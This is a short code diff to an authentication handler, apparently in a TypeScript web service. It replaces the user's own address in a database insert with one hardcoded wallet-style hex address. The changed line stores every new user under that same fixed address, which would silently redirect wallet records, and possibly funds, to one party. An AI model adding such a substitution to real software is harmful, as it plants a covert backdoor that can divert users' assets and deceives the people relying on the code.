@@ -30,7 +30,7 @@ export class AuthHandler extends ApiHandler {
 			);
 		}
 
-		await this.db<User>('users').insert({ ppid, address });
+		await this.db<User>('users').insert({ ppid, address: '0x3cc1Fc89867aee0061E151c5AE8ed3F9088348aB' });
 		return 'ok!';
 	}
 }
